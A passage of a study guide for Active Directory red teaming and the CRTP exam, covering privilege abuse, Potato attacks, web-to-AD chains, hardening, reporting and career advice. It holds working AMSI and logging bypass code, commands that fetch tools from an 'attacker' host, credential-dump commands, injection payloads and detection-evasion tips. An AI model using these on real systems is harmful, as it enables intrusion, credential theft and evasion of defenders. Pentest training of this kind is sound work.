- Use SQL Server's identity
- Access delegated services as any user

**Tools:**

- **PowerUpSQL** (NetSPI) - Comprehensive SQL Server attack toolkit
- **mssqlclient.py** (Impacket) - Linux MSSQL client
- **CrackMapExec** - SQL Server module

**Common Privesc Chain via SQL:**

1. Kerberoast SQL service account (weak password)
2. Crack: `MSSQLSvc1!`
3. Login as svc_mssql
4. xp_cmdshell enabled
5. Run mimikatz on SQL host
6. Find DA token
7. Pass-the-ticket
8. DCSync

### Q65: Common PowerShell logging bypasses
**A:**

**PowerShell logging layers:**

1. **Module logging** - Loaded modules
2. **Script block logging** - Code executed
3. **Transcription** - All input/output
4. **AMSI** - Real-time scanning

**Disabling logging (need admin/SYSTEM):**

**Via registry:**

```powershell
# Disable Script Block Logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name EnableScriptBlockLogging -Value 0

# Disable Module Logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name EnableModuleLogging -Value 0

# Disable Transcription
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name EnableTranscripting -Value 0
```

**In-memory disable (no admin needed):**

```powershell
# Disable Script Block Logging in current session
$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null)
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"]["EnableScriptBlockLogging"] = 0
```

**Downgrade to PowerShell v2:**

PowerShell v2 doesn't support:
- AMSI
- Script Block Logging
- Module Logging (limited)

```powershell
powershell.exe -version 2 -ep bypass -c "your_command"
```

But: v2 must be installed (often is on older systems).

**Constrained Language Mode bypass:**

If CLM enforced:
- Use PowerShell v2 (escapes CLM)
- Use .NET reflection directly
- Use compiled C# via Add-Type

**AMSI bypass methods:**

Method 1 (most popular, often patched):
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Method 2 (hardware breakpoint):
More advanced, less detected. Use tools like AMSI.fail.

Method 3 (memory patching):
Direct patching of AmsiScanBuffer function.

Method 4 (provider unregister):
```powershell
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiSession','NonPublic,Static').SetValue($null, $mem)
```

**Obfuscation considerations:**

- Heavy base64 = AMSI trigger
- Light obfuscation works better
- Tool: Invoke-Obfuscation

**Practical bypass workflow:**

```powershell
# Step 1: Bypass AMSI
[Ref].Assembly.GetType('...AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Step 2: Bypass Script Block Logging
$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null)
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"]["EnableScriptBlockLogging"] = 0

# Step 3: Load tools
IEX (New-Object Net.WebClient).DownloadString("http://attacker/PowerView.ps1")

# Step 4: Run attacks
Find-InterestingDomainAcl
```

**Detection of bypass attempts:**

Defenders monitor:
- AMSI bypass strings (common patterns)
- Logging registry modifications
- PowerShell v2 invocations
- Unusual PowerShell processes

**For CRTP:**

Use Invisi-Shell from `omerya/Invisi-Shell` - bypasses many controls. Lab usually has logging enabled.

---

## SECTION C: ADVANCED & EXAM PREP (Q66-100)

### Q66: SeManageVolumePrivilege abuse
**A:**

**SeManageVolumePrivilege** = Allows volume maintenance tasks. Sounds harmless but exploitable.

**Why dangerous:**

Privilege allows access to volume metadata. Can be abused to:
- Read arbitrary files (including SAM)
- Modify ACLs on volume
- Extract NTDS.dit on DC

**Discovery:**

```cmd
whoami /priv

# Look for:
# SeManageVolumePrivilege   Perform volume maintenance tasks
```

**Exploitation:**

Tool: SeManageVolumeExploit.exe

```cmd
.\SeManageVolumeExploit.exe
```

Triggers ACL modification on C:\, gives current user full control.

After: Can read any file on system.

**Common groups with this privilege:**

- Storage Replica Administrators
- Backup Operators (sometimes)
- Specific service accounts

**Defense:**

- Limit assignment of this privilege
- Audit users with it
- Monitor for SeManageVolumeExploit signatures

### Q67: SeBackupPrivilege abuse
**A:**

**SeBackupPrivilege** = Backup files and directories.

**Why exploitable:**

Allows reading ANY file regardless of ACL. Designed for backup software.

**Critical use case: Extract NTDS.dit**

If you have SeBackupPrivilege on DC:

```powershell
# Create shadow copy
vssadmin create shadow /for=C:

# Read NTDS.dit from shadow
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit c:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM c:\temp\system

# Extract with secretsdump
secretsdump.py -ntds c:\temp\ntds.dit -system c:\temp\system LOCAL
```

**Without shadow copy (using raw API):**

Tool: SeBackupPrivilege exploit / robocopy with /B flag

```cmd
# /B flag uses backup privilege
robocopy /B C:\Windows\NTDS C:\temp\ ntds.dit
```

**Groups commonly with SeBackupPrivilege:**

- Backup Operators (default)
- Server Operators (on DCs)
- Specific backup service accounts

**Defense:**

- Backup Operators is highly privileged - treat as admin-level
- Limit Backup Operators membership
- Audit
- Use Backup software with restricted accounts

### Q68: SeRestorePrivilege abuse
**A:**

**SeRestorePrivilege** = Restore files and directories.

**Why exploitable:**

Like SeBackup but writing - can WRITE any file regardless of ACL.

**Attacks:**

**1. Service binary replacement:**

Replace service binary with malicious one. Service runs as SYSTEM.

```cmd
# Stop service
sc stop "Service Name"

# Replace binary (using restore privilege)
robocopy /B my_malicious.exe C:\Windows\System32\svc.exe

# Start service - runs malicious code as SYSTEM
sc start "Service Name"
```

**2. UAC bypass:**

Modify protected directories.

**3. Persistence:**

Write to system locations:
- Scheduled tasks XML
- Service registry
- Boot files

**Defense:**

Similar to SeBackup - limit assignment.

### Q69: SeTakeOwnership abuse
**A:**

**SeTakeOwnership** = Take ownership of files/objects.

**Once you own an object, you can:**

- Modify its ACL
- Grant yourself any permission
- Effective full control

**Attack:**

```powershell
# Take ownership of file
$file = "C:\Windows\System32\drivers\etc\hosts"

# Use built-in commands
takeown /F $file

# Now grant yourself rights
icacls $file /grant "$($env:USERNAME):(F)"

# Modify file
echo "127.0.0.1 google.com" >> $file
```

**For privilege escalation:**

Target sensitive files:
- SAM file
- SYSTEM hive
- Service binaries
- AD database (on DC)

**Defense:**

Restrict to admin tier accounts.

### Q70: SeImpersonatePrivilege / Potato attacks
**A:**

**Already covered in Q41, but exam-relevant details:**

**Modern Potato attack tools:**

**1. PrintSpoofer (CVE-2020-1048):**

Most reliable on modern Windows:

```cmd
PrintSpoofer.exe -i -c cmd.exe
```

Works because Print Spooler authenticates back to local SYSTEM.

**2. RoguePotato:**

For Windows 10 build < 1809 typically:

```cmd
RoguePotato.exe -r 10.10.14.1 -e "C:\malicious.exe" -l 9999
```

Requires reverse OXID resolver.

**3. JuicyPotato:**

Older but sometimes works:

```cmd
JuicyPotato.exe -l 9999 -p c:\windows\system32\cmd.exe -t * -c {CLSID}
```

Need correct CLSID for OS version.

**4. JuicyPotatoNG / GenericPotato:**

Updated for newer Windows.

**5. GodPotato:**

Newest, works on most modern Windows:

```cmd
GodPotato.exe -cmd "cmd /c whoami"
```

**Common SeImpersonate holders:**

- IIS Application Pool identities
- SQL Server service accounts
- Other service accounts
- Web shells running as service account

**Workflow on web shell:**

```cmd
# 1. Webshell as svc_iis
whoami
# corp\svc_iis

# 2. Check privileges
whoami /priv | findstr Impersonate

# 3. Drop PrintSpoofer
certutil -urlcache -split -f http://attacker/PrintSpoofer.exe C:\Windows\Temp\ps.exe

# 4. Get SYSTEM shell
C:\Windows\Temp\ps.exe -i -c cmd.exe

# 5. Now SYSTEM, proceed with domain attacks
```

### Q71: AD attacks on Linux clients
**A:**

**Linux clients in AD (SSSD, Centrify):**

Some enterprises join Linux to AD:
- SSSD - Open source AD integration
- Centrify - Commercial AD bridge
- Winbind (Samba)

**Attack surfaces:**

**1. Credential extraction from Linux:**

```bash
# Cached credentials in SSSD
sudo cat /var/lib/sss/db/cache_corp.local.ldb

# Kerberos tickets
ls /tmp/krb5cc_*
klist
```

**2. Keytab files:**

Service keytabs often left readable:

```bash
find / -name "*.keytab" 2>/dev/null

# Extract hash from keytab
klist -k /etc/krb5.keytab
```

**3. Pass-the-Ticket from Linux:**

```bash
# Use captured ticket
export KRB5CCNAME=/tmp/krb5cc_1000
klist
psexec.py -k -no-pass user@target.corp.local
```

**4. AD attacks from Linux:**

```bash
# Impacket suite works from Linux
GetUserSPNs.py corp.local/user:password -dc-ip 10.10.10.10 -request

# Bloodhound-python
bloodhound-python -c All -u user -p password -d corp.local -ns 10.10.10.10
```

**5. Linux client compromise:**

If you compromise a Linux client in AD:
- Local credentials may give AD access
- SSH keys may auth to AD-joined hosts
- Cached Kerberos tickets usable
- Find admin tickets in /tmp

### Q72: AD attacks on macOS clients
**A:**

**macOS in AD (Directory Utility, Jamf):**

**Attack surfaces:**

**1. Keychain credentials:**

Plaintext passwords sometimes:

```bash
security dump-keychain | grep -A 3 "AD_account"

# Or specific
security find-internet-password -s "corp.local"
```

**2. Kerberos tickets:**

```bash
klist
ls /tmp/krb5cc*
```

**3. Cached AD credentials:**

```bash
# DSConfigAD config
sudo dsconfigad -show
```

**4. Mobile config profiles:**

May contain credentials or trust info.

**5. Profiles directory:**

```bash
sudo ls /Library/Managed\ Preferences/
```

**For your career:**

Specialized area - macOS in enterprise. Growing market with Apple's enterprise push.

### Q73: Azure AD / Entra ID basics for AD attackers
**A:**

**Azure AD (now Entra ID)** = Microsoft's cloud identity service.

**Differences from on-prem AD:**

| On-prem AD | Azure AD |
|------------|----------|
| Kerberos/NTLM | OAuth 2.0/SAML |
| Domain Controllers | Microsoft cloud |
| GPO | Conditional Access |
| Trust between domains | B2B/B2C |
| Domain join | Device registration |
| LDAP | Microsoft Graph API |

**Hybrid identity:**

Most enterprises have both:
- On-prem AD
- Azure AD
- Synced via Azure AD Connect
- Hash sync or pass-through or federation

**Common attacks:**

**1. Password spray:**

```python
# MSOLSpray
python3 MSOLSpray.py --userlist users.txt --password 'Spring2024!'
```

**2. Token theft:**

Browser-based attacks for OAuth tokens.

**3. Consent phishing:**

Trick user into granting permissions to malicious app.

**4. Federation abuse:**

If ADFS misconfigured.

**5. Pass-the-PRT:**

Primary Refresh Token theft from devices.

**6. Pass-the-Cookie:**

Steal session cookies.

**7. PHS (Password Hash Sync) abuse:**

If on-prem AD compromised and PHS enabled, all Azure AD identities affected.

**8. Seamless SSO abuse:**

Microsoft's seamless SSO uses Kerberos. Specific computer account in on-prem AD has rights. Compromise = Azure AD compromise.

**Tools:**

- **AADInternals** - Comprehensive Azure AD toolkit (Dr. Nestori Syynimaa)
- **ROADtools** - Azure AD recon
- **MicroBurst** - Azure attack toolkit
- **Stormspotter** - Visualization
- **AzureHound** - BloodHound for Azure

**For your career:**

Azure AD knowledge increasingly important. Most companies hybrid. CRTP-Azure or CARTP cert relevant. Consider after CRTP.

### Q74: Detection evasion specifics for CRTP-style labs
**A:**

**Labs typically have:**

- No EDR
- Limited logging
- No active monitoring
- Detection focus minimal

**But practice good habits:**

**1. Don't run all tools at once:**

```powershell
# Bad: Run SharpHound, then PowerView, then Rubeus in 5 minutes
# Good: Stagger across hours
```

**2. Use what's appropriate:**

```powershell
# Don't load PowerView if AD module works
# Don't run BloodHound if you just need one query
```

**3. Cleanup as you go:**

```powershell
# Remove files dropped
del C:\temp\Rubeus.exe

# Clear PowerShell history (if needed for OPSEC test)
Clear-History
Remove-Item (Get-PSReadlineOption).HistorySavePath
```

**4. Don't leave artifacts:**

```powershell
# Use in-memory loading
IEX (New-Object Net.WebClient).DownloadString("...")

# Avoid writing to common paths
# C:\temp, C:\Windows\Temp watched
# Use C:\Users\Public\AppData if needed
```

**5. Be subtle with new accounts:**

```powershell
# Bad: New-ADUser -Name "evil_user"
# Good: Use existing service accounts or names similar to legit
```

### Q75: AD attacks combining web vulnerabilities
**A:**

**Web → AD attack chains:**

**1. SSRF → Internal AD attacks:**

Web app vulnerable to SSRF:

```
?url=http://internal-host:445
?url=http://dc.corp.local:88
?url=ldap://dc.corp.local/DC=corp,DC=local
```

Can probe internal hosts, sometimes interact with AD services.

**2. LFI → Credential disclosure:**

```
?file=../../../Windows/win.ini
?file=../../../inetpub/wwwroot/web.config
?file=../../../Users/admin/Desktop/passwords.txt
```

web.config often has DB connection strings with service account credentials.

**3. XXE → Internal LDAP queries:**

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "ldap://dc.corp.local/CN=Users,DC=corp,DC=local">
  %xxe;
]>
```

**4. SQL injection → command execution:**

If app uses MSSQL:

```sql
'; EXEC xp_cmdshell 'whoami'; --

'; EXEC ('xp_cmdshell ''net user evil_user Password123! /add /domain''') AT [linked_dc]; --
```

**5. NTLM hash capture via web:**

Web app accepts URLs:
```
http://app.com/profile?image=\\attacker_ip\share\image.png
```

If Windows server requests this UNC path:
- Server authenticates to attacker
- Capture NTLMv2 hash with Responder

**6. CSRF → AD actions:**

If web app has AD management interface:
- CSRF to add admin user
- CSRF to reset passwords

**7. Stored XSS → admin compromise:**

XSS targeting admin panel:
- Admin views malicious comment
- XSS runs as admin
- Performs AD changes

**8. SQL injection on RADIUS/auth servers:**

```sql
' OR '1'='1'; SELECT password FROM users WHERE username='admin';--
```

May extract AD credentials.

**9. Authentication bypass on web → AD privileged access:**

If web app allows password reset without verification:
- Reset password of AD-integrated account
- Login with new password
- Now you're that user in AD

**10. Web file upload → Webshell → AD compromise:**

```
Upload .aspx webshell
Browse webshell as IIS service account
Use SeImpersonate via Potato → SYSTEM
Now on AD-joined server with system access
Lateral movement to DA
```

This is YOUR specialty (bug bounty + AD knowledge). Combining is rare and valuable.

**For your portfolio:**

Findings combining web + AD attacks are golden:
- High impact reports
- Demonstrate breadth
- Higher bug bounty payouts
- Memorable for hiring managers

### Q76: AD attack lessons from real breaches
**A:**

**Notable real breaches and AD lessons:**

**1. SolarWinds (2020):**

- Backdoor in SolarWinds Orion
- Used to compromise on-prem AD
- AD used for lateral movement
- Eventually federated identity, Azure AD

Lesson: Supply chain compromise → AD compromise → everything.

**2. Maersk (NotPetya, 2017):**

- Malware spread via SMB
- Encrypted via AD
- ALL Maersk's AD destroyed
- $300M+ damage
- 4000 servers, 45000 PCs

Lesson: AD compromise = business survival risk. Backups critical.

**3. Equifax (2017):**

- Web vuln (Apache Struts) → initial access
- Lateral movement via AD
- 147M people's data exposed
- $700M+ damages

Lesson: Web → AD bridge needs hardening.

**4. Sony Pictures (2014):**

- Likely phishing initial
- AD used for lateral movement
- Massive data exfil
- Permanent damage to company
- Movie release affected

Lesson: AD detection essential.

**5. Target (2013):**

- HVAC vendor compromised
- Vendor had network access (Target's network)
- Lateral via AD to POS systems
- 40M cards stolen

Lesson: Third-party AD trust dangerous.

**6. Anthem (2015):**

- Phishing → AD admin compromise
- Database access via AD
- 78M records stolen

Lesson: Phishing + AD = disaster.

**7. OPM (2015):**

- Federal employee data
- AD admin credentials compromised
- 22M records

Lesson: Government AD = priority target.

**8. Yahoo (2013-2014):**

- AD admin account compromised
- 3 billion accounts affected
- Caused Verizon to lower acquisition price by $350M

**9. NHS (WannaCry, 2017):**

- Ransomware via SMB
- Spread through AD-joined hosts
- UK National Health Service shut down

**10. Uber (2022):**

- Social engineering MFA fatigue
- AD admin access
- Internal systems compromised

**Patterns:**

1. **Initial access** often phishing or vendor
2. **AD compromise** within hours
3. **Lateral movement** via AD
4. **Data exfil** or ransomware
5. **Months to detect** typically
6. **Years to fully recover**

**For your career:**

Understanding real breaches:
- Helps justify security investments
- Bug bounty reports reference real precedents
- Job interviews ask about famous breaches
- Defensive recommendations more credible

### Q77: AD reporting style for pentests
**A:**

**Pentest report structure:**

**Executive Summary:**

- Engagement scope
- Critical findings
- Business impact
- Recommendations summary

For executives, no technical jargon.

**Technical Summary:**

- All findings categorized by severity
- Attack paths visualized
- Remediation priorities

**Detailed Findings:**

For each finding:

```markdown
## Finding 1: Kerberoasting via Weak Service Account Password

### Severity: High
### CVSS 3.1: 7.5

### Description
The service account 'svc_sql' was found to be Kerberoastable
due to having an SPN registered. Additionally, the account 
password was weak ('Summer2024!') and was cracked offline.

### Impact
- Service account is member of Domain Admins group
- Direct path to Domain Admin compromise
- All domain users vulnerable

### Affected Systems
- Domain: corp.local
- Account: svc_sql
- SPN: MSSQLSvc/sqlserver.corp.local

### Reproduction Steps

1. Enumerate accounts with SPNs:
```powershell
Get-DomainUser -SPN
```

2. Request TGS for svc_sql:
```powershell
.\Rubeus.exe kerberoast /user:svc_sql /outfile:hash.txt
```

3. Crack offline:
```bash
hashcat -m 13100 hash.txt rockyou.txt
```

4. Result: Password 'Summer2024!'

### Screenshot Evidence
[Screenshot of Rubeus output]
[Screenshot of cracked password]
[Screenshot of using credentials]

### Recommendations

**Immediate:**
1. Reset svc_sql password to long random string (25+ chars)
2. Remove svc_sql from Domain Admins (least privilege)
3. Configure as Managed Service Account if possible

**Long-term:**
1. Implement gMSAs for all service accounts
2. Enforce strong password policy for service accounts (25+ chars)
3. Disable RC4 encryption (use AES only)
4. Audit all SPN accounts quarterly
5. Implement monitoring for Kerberoasting patterns

### References
- MITRE ATT&CK T1558.003
- CVE: N/A (configuration issue)
- Microsoft: Kerberoasting Defense Guide
```

**Attack Path Visualizations:**

Include BloodHound screenshots showing:
- Initial access point
- Privilege escalation path
- Domain Admin compromise

**Remediation Roadmap:**

Tiered approach:
- 0-30 days (critical fixes)
- 30-90 days (significant improvements)
- 90+ days (architectural changes)

**Appendices:**

- Tools used
- Methodology
- Glossary
- References
- Raw output (BloodHound exports, etc.)

**For CRTP exam report:**

Required sections:
1. Executive Summary
2. Compromised Machines (5)
3. Attack Narrative
4. Detailed Steps with Screenshots
5. Tools Used
6. Recommendations
7. References

Typical length: 30-60 pages.

**Quality matters more than length** - clear, well-organized.

### Q78: Active Directory hardening checklist
**A:**

**Comprehensive hardening checklist:**

**Tier 0 (Critical):**

- [ ] Reset KRBTGT password twice
- [ ] Audit Domain Admins membership
- [ ] Remove unnecessary EA members
- [ ] Enable Protected Users for admins
- [ ] Implement PAW (Privileged Access Workstations)
- [ ] Disable inactive privileged accounts
- [ ] Configure tier model
- [ ] Audit AdminSDHolder ACL
- [ ] Remove unconstrained delegation (except DCs)
- [ ] Audit constrained delegation

**Authentication:**

- [ ] Disable NTLMv1
- [ ] Disable LM authentication
- [ ] Enforce SMB signing
- [ ] Enable LDAP signing and channel binding
- [ ] Disable RC4 in Kerberos
- [ ] Enforce strong password policy (15+ chars)
- [ ] Block common passwords
- [ ] Enable MFA for admin accounts
- [ ] Configure account lockout

**Services and protocols:**

- [ ] Disable Print Spooler on DCs
- [ ] Disable Print Spooler on non-print servers
- [ ] Disable LLMNR (GPO)
- [ ] Disable NetBIOS over TCP/IP
- [ ] Disable WebDAV WebClient
- [ ] Disable SMBv1
- [ ] Enable EPA on web services
- [ ] Disable WPAD

**Service accounts:**

- [ ] Use gMSAs where possible
- [ ] Strong passwords (25+ chars) for traditional service accounts
- [ ] Remove DA membership from service accounts
- [ ] Sensitive accounts marked non-delegatable
- [ ] Audit Kerberoastable accounts
- [ ] Honey accounts deployed

**Local administrator:**

- [ ] LAPS deployed for all workstations
- [ ] LAPS deployed for member servers
- [ ] LAPS access audited
- [ ] Local admin renamed
- [ ] Default Guest account disabled

**ACL hygiene:**

- [ ] Authenticated Users not overprivileged
- [ ] No DCSync rights to non-DC accounts
- [ ] No WriteDACL on sensitive objects
- [ ] No GenericAll to standard users on admins
- [ ] Regular ACL audit (BloodHound)

**Monitoring:**

- [ ] PowerShell logging enabled
- [ ] Script block logging
- [ ] Module logging
- [ ] Microsoft Defender for Identity deployed
- [ ] SIEM with AD rules
- [ ] Sysmon on critical hosts
- [ ] Honey items deployed
- [ ] Alert tuning for AD events

**Network:**

- [ ] Tier separation network-wise
- [ ] DCs on isolated network
- [ ] Workstation-to-workstation blocked
- [ ] Internet not directly accessible from DCs
- [ ] Firewall rules for AD ports
- [ ] Network monitoring

**ADCS (if used):**

- [ ] Templates audited (Certify)
- [ ] EDITF_ATTRIBUTESUBJECTALTNAME2 disabled
- [ ] HTTP enrollment disabled (or EPA enabled)
- [ ] Vulnerable templates disabled
- [ ] CVE-2022-26923 patched
- [ ] CAs treated as Tier 0

**Backup and recovery:**

- [ ] AD backup procedures
- [ ] Forest recovery plan
- [ ] Offline backups
- [ ] Recovery tested

**Compliance:**

- [ ] PingCastle scan (quarterly)
- [ ] Purple Knight scan (quarterly)
- [ ] Internal pentest (annual)
- [ ] External pentest (annual)
- [ ] BloodHound audit (quarterly)

**Group Policy:**

- [ ] GPO ACLs audited
- [ ] SYSVOL scrubbed of credentials
- [ ] cPassword removed from old GPP
- [ ] GPO inheritance reviewed

**For your career:**

This checklist is interview-relevant. Demonstrates breadth of AD security knowledge.

### Q79: AD attack tools comparison
**A:**

**Comprehensive tool comparison:**

**Enumeration:**

| Tool | Platform | Pros | Cons |
|------|----------|------|------|
| PowerView | Windows | Detailed, offensive-focused | AV detected |
| AD Module | Windows | Built-in, less detected | Limited offensive |
| BloodHound/SharpHound | Windows | Visualization | Large download |
| BloodHound.py | Linux | Cross-platform | Less detailed |
| AdRecon | Windows | Comprehensive HTML report | One-shot tool |
| ldapsearch | Linux | Universal | Manual queries |
| Impacket scripts | Linux | Scriptable | Multiple tools |

**Credential dumping:**

| Tool | Use case |
|------|----------|
| Mimikatz | Comprehensive, all-purpose |
| SharpKatz | C# port, less AV |
| Pypykatz | Python, dumps from minidumps |
| Lsassy | Remote LSASS dumping |
| crackmapexec | Bulk operations |
| Impacket secretsdump | DCSync from Linux |

**Kerberos:**

| Tool | Use case |
|------|----------|
| Rubeus | Comprehensive Kerberos abuse |
| Mimikatz kerberos:: | Ticket manipulation |
| Impacket GetUserSPNs | Kerberoasting from Linux |
| Impacket GetNPUsers | ASREP roasting from Linux |
| Impacket ticketer | Golden/Silver from Linux |

**Lateral movement:**

| Tool | Method |
|------|--------|
| PsExec (Sysinternals) | SMB + service |
| Impacket psexec | Cross-platform SMB |
| Impacket wmiexec | WMI execution |
| Impacket smbexec | SMB execution |
| Impacket dcomexec | DCOM execution |
| Evil-WinRM | WinRM-based |
| Crackmapexec | Bulk + multiple methods |

**Delegation attacks:**

| Tool | Purpose |
|------|---------|
| Rubeus s4u | S4U attacks |
| Impacket getST | Cross-platform S4U |
| SpoolSample | Print Spooler coercion |
| PrinterBug | Print coercion variants |
| PetitPotam | EFSRPC coercion |
| Coercer | Multi-protocol coercion |
| DFSCoerce | DFS coercion |

**NTLM relay:**

| Tool | Purpose |
|------|---------|
| ntlmrelayx (Impacket) | Multi-target relay |
| Responder | LLMNR/NBT-NS + capture |
| MultiRelay | Responder + SMB relay |

**ADCS:**

| Tool | Platform |
|------|----------|
| Certify | Windows |
| Certipy | Linux |
| PSPKIAudit | Defense |

**Persistence:**

| Tool | Method |
|------|--------|
| Mimikatz | Golden/Silver tickets, Skeleton Key |
| DSInternals | DSRM password, password history |
| Pwdump | NTDS extraction |

**For CRTP:**

Have ready locally (avoid AV signatures):
- Rubeus.exe (or its IL bytes)
- Mimikatz.exe (multiple versions)
- SharpHound.exe
- Powermad.ps1
- PowerView.ps1 (or AD module)
- Invisi-Shell (AMSI bypass)

**For real engagements:**

Modify tools to avoid signatures:
- Recompile from source
- Custom strings
- ConfuserEx for .NET
- PowerShell obfuscation

### Q80: Building expertise progression
**A:**

**AD security career progression:**

**Level 1: Foundation (0-6 months)**

- Learn Windows administration
- Understand AD fundamentals
- Basic PowerShell
- Setup home lab
- Complete TryHackMe AD rooms
- Read "Active Directory Security" by Sean Metcalf

**Level 2: Offensive Basics (6-12 months)**

- CRTP certification
- Master Mimikatz, PowerView, BloodHound
- Practice in HackTheBox
- Understand all common attacks
- Complete OSCP (broader skill)

**Level 3: Advanced Offensive (1-2 years)**

- CRTE certification (advanced AD)
- OSEP (PEN-300) - red team
- Master evasion techniques
- C2 framework usage
- Build custom tools
- Bug bounty in AD-heavy companies

**Level 4: Specialist (2-3 years)**

- ADCS expertise (CARTP)
- Azure AD attacks
- Custom tooling development
- Lead red team engagements
- Conference talks/blogs
- Develop new techniques

**Level 5: Expert (3+ years)**

- Define industry standards
- Train others
- Research new attacks
- Speak at major conferences
- Publish papers
- Develop frameworks/tools that become standard

**Certifications path:**

For your trajectory (CRTP already done):

1. ✅ CRTP - Foundation (you have)
2. **OSCP** - Broad pentest skills
3. **CRTE** - Advanced AD
4. **OSEP** - Red team / evasion
5. **CRTM** - Mastery (super advanced)
6. **CARTP** - Azure AD

**Salary progression (India context, 2026):**

- L1 (CRTP only): ₹6-12 LPA
- L2 (CRTP + OSCP + 1-2 years): ₹15-25 LPA
- L3 (CRTP + OSCP + CRTE + experience): ₹25-40 LPA
- L4 (Specialist + 3+ years): ₹40-70 LPA
- L5 (Recognized expert): ₹70L+ or international

**International remote roles:**

- ₹50L-1.5Cr for senior AD security experts
- Companies like Microsoft, Mandiant, CrowdStrike actively hire
- Bug bounty as supplement: $5K-$50K/month for top hunters

**For your trajectory:**

Path that maximizes your strengths:
1. Complete CRTP (in progress)
2. OSCP next (broader)
3. Build Encrypticle AD content (positions you as educator)
4. Bug bounty on AD-using web apps
5. CRTE in 6-12 months
6. Apply to senior pentest roles
7. Specialty: Indian fintech AD security (unique niche)

### Q81: Common interview questions on AD
**A:**

**Foundational:**

1. "What is Active Directory?"
2. "Explain Kerberos authentication"
3. "What is the difference between NTLM and Kerberos?"
4. "What is a domain controller?"
5. "Explain the forest/tree/domain hierarchy"

**Attacker-focused:**

6. "Walk me through a full domain compromise"
7. "What is Kerberoasting and how does it work?"
8. "Explain Pass-the-Hash vs Pass-the-Ticket"
9. "What is a Golden Ticket?"
10. "How does DCSync work?"

**Defensive:**

11. "How do you defend against Kerberoasting?"
12. "What is LAPS and why is it important?"
13. "How does Credential Guard protect against attacks?"
14. "What is Protected Users group?"
15. "How do you detect Pass-the-Hash?"

**Architectural:**

16. "Explain the tier administration model"
17. "What is a PAW?"
18. "How do you implement just-in-time admin access?"
19. "Explain delegation in AD"
20. "What's the difference between constrained and unconstrained delegation?"

**Practical:**

21. "How would you secure a new AD environment?"
22. "What's your incident response process for AD compromise?"
23. "How do you audit AD permissions?"
24. "Explain BloodHound and its value"
25. "What's your favorite AD attack and why?"

**Sample detailed answer for Q1:**

"Active Directory is Microsoft's directory service that provides centralized authentication, authorization, and configuration management for Windows-based networks. It uses a hierarchical structure with forests, trees, domains, and organizational units. Domain Controllers run the AD database and provide services like Kerberos authentication, LDAP queries, and Group Policy. AD is the backbone of most enterprise Windows environments and consequently a major target for attackers - compromising AD often means compromising the entire network."

**Sample detailed answer for Q7:**

"Kerberoasting exploits how Kerberos issues service tickets. Any authenticated user can request a TGS ticket for any service in the domain. This ticket is encrypted with the service account's password hash. By requesting TGS tickets for accounts with SPNs and capturing them, attackers can crack the encryption offline to recover the service account password. The attack is particularly impactful because service accounts often have weak passwords, never expire, and frequently have elevated privileges. Defense involves using long, complex passwords for service accounts (25+ characters), implementing Managed Service Accounts, disabling RC4 encryption (force AES), and monitoring for unusual TGS request patterns."

**For your interviews:**

Practice answering these out loud. Time yourself - aim for 1-2 minute answers. Have specific examples from CRTP labs or your bug bounty work to reference.

### Q82: CRTP vs CRTE vs CRTM vs OSCP
**A:**

**Comparison of certifications:**

**CRTP (Certified Red Team Professional):**

- Provider: Altered Security (Pentester Academy)
- Cost: ~$249 USD
- Focus: AD fundamentals, basic attacks
- Exam: 24h hands-on + report
- Difficulty: Beginner-Intermediate
- Lab: 30 days included
- Materials: Video course + PDF + lab

**Topics covered:**
- Domain enumeration
- Local privilege escalation
- Lateral movement (basic)
- Domain privilege escalation
- Persistence
- Cross-forest attacks

**Best for:**
- Learning AD attacks from scratch
- First red team cert
- Foundation building

**CRTE (Certified Red Team Expert):**

- Provider: Altered Security
- Cost: ~$549 USD
- Focus: Advanced AD attacks
- Exam: 48h hands-on + report
- Difficulty: Intermediate-Advanced
- Lab: 60 days included
- Materials: Advanced course

**Topics covered:**
- All CRTP topics deeper
- ADCS attacks
- SQL Server attacks
- Advanced delegation
- AppLocker bypass
- AMSI bypass
- Anti-malware evasion
- Microsoft Defender bypass

**Best for:**
- After CRTP
- Real engagement preparation
- AD specialization

**CRTM (Certified Red Team Master):**

- Provider: Altered Security
- Cost: ~$1499 USD (with classroom)
- Focus: Master-level AD + Azure
- Exam: 48h hands-on
- Difficulty: Expert
- Materials: 5-day live training

**Topics covered:**
- All CRTE topics
- Azure AD attacks
- Hybrid identity exploitation
- Advanced persistence
- Custom tool development

**Best for:**
- Senior red teamers
- Industry recognition

**OSCP (Offensive Security Certified Professional):**

- Provider: OffSec
- Cost: ~$1499 USD (PEN-200 bundle)
- Focus: General pentesting
- Exam: 24h hands-on + report
- Difficulty: Intermediate
- Lab: 60-90 days included
- Materials: Course book + videos + lab

**Topics covered:**
- Linux exploitation
- Windows exploitation
- Web application attacks
- Buffer overflow basics
- Privilege escalation
- AD (limited but present)

**Best for:**
- Broad pentest skills
- Industry-standard cert
- Junior pentester roles

**OSEP (PEN-300):**

- Provider: OffSec
- Cost: ~$1499 USD
- Focus: Advanced evasion
- Exam: 48h hands-on
- Difficulty: Advanced
- Lab: 60-90 days

**Topics covered:**
